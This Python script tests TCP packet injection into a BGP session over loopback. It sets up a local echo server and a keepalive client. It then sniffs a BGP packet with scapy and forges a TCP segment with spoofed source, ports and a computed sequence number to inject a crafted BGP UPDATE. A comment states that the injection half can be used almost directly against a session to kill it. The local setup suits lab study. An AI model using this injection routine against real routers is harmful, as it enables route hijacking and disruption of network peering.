"""
Locally testing TCP packet injection using scapy to send a packet with a socket that was created with Python's socket library.

First it starts an server on port 179 in a separate thread
- This server echoes back any data it receives.

Then it creates a client that connects to that server in a separate thread
- sends a BGP KEEPALIVE message every 10 seconds.

After 10 seconds, start sniffing with scapy for a BGP packet on loopback interface.
When a packet is received, the inject_packet function is then called.
- This manually builds a BGP UPDATE message and sends it to the server, sleeping for 15 seconds before exiting.
"""

from custom_python_scripts.bgp_messages import BGPUpdate, BGPNotification, BGPKeepAlive, BGPOpen
from fields import IntField, StringField, ListField, LengthField, Field, MetaField
from bgp_fields import (
    IPv4AddressField,
    PathAttribute,
    Origin,
    ASPath,
    NextHop,
    MultiExitDisc,
    NetworkLayerReachabilityInformation,
    Capability,
    MultiprotocolExtensions,
    RouteRefresh,
    BGPExtended,
    GracefulRestart,
    FourOctetASNumber,
    Dynamic,
    AdditionalPaths,
    EnhancedRouteRefresh,
    LongLivedGracefulRestart,
    FQDN,
    SoftwareVersion,
    PathsLimit,
    OptionalParameter,
    BGPHeader,
)

import socket

from scapy.all import IP, TCP, sniff, Ether, Raw, send

import threading
from time import sleep


def listen_for_connection():
    def handle_conn(sock):
        while True:
            data1 = sock.recv(1024)
            if not data1:
                break
            sock.send(data1)

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('127.0.0.1', 179))
    server.listen(1)
    conn, addr = server.accept()
    handle_conn(conn)


def connect():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('127.0.0.1', 179))
    while True:
        bgp_keepalive = BGPKeepAlive()
        sock.send(bgp_keepalive.to_bytes())
        sleep(10)


# Create a local client/server TCP connection to simulate traffic of an established BGP session
print('Starting server on port 179...')
threading.Thread(target=listen_for_connection, daemon=True).start()
print('Connecting to server...')
threading.Thread(target=connect, daemon=True).start()


'''
Everything Below this point can be used almost directly to inject a BGP UPDATE message into the BGP session, potentially killing the session.
'''

sent = False
def inject_packet(pkt):
    global sent
    if sent:
        return
    if pkt.haslayer(TCP) and pkt[TCP].dport == 179:
        sleep(2)
        # Set destination port to captured BGP packet TCP port number
        mydport = pkt[0].dport
        # Set source port to captured BGP packet TCP port number
        mysport = pkt[0].sport
        # Set sequence number to captured BGP packet + 19
        # (captured packet should be a KEEPALIVE which is 19 bytes)
        seq_num = pkt[0].seq + 19
        # Set ack number to captured BGP packet
        ack_num = pkt[0].ack
        # Set source IP address to captured BGP packet
        ipsrc = pkt[0][IP].src
        # Set desination IP address to captured BGP packet
        ipdst = pkt[0][IP].dst

        data = BGPUpdate()
        origin = Origin(0x40, 0)
        as_path = ASPath(0x50, 4, [64510])
        next_hop = NextHop(0x40, '192.168.0.1')
        med = MultiExitDisc(0x80, 0)
        nlri = NetworkLayerReachabilityInformation('192.168.1.0', 24)

        data.path_attributes.extend([origin, as_path, next_hop, med])
        data.set_nlri(nlri)
        data: bytes = data.to_bytes()

        bgp_update = IP(src=ipsrc, dst=ipdst, ttl=1) / TCP(dport=mydport, sport=mysport, flags='PA', seq=seq_num, ack=ack_num) / Raw(load=data)

        send(bgp_update, iface='lo0')
        sent = True
        sleep(15)
        exit(0)


sleep(10)
print('Sniffing...')
sniff(prn=inject_packet, iface='lo0')
